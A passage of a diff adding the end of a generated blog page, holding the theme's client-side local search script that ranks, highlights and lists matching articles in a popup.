+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
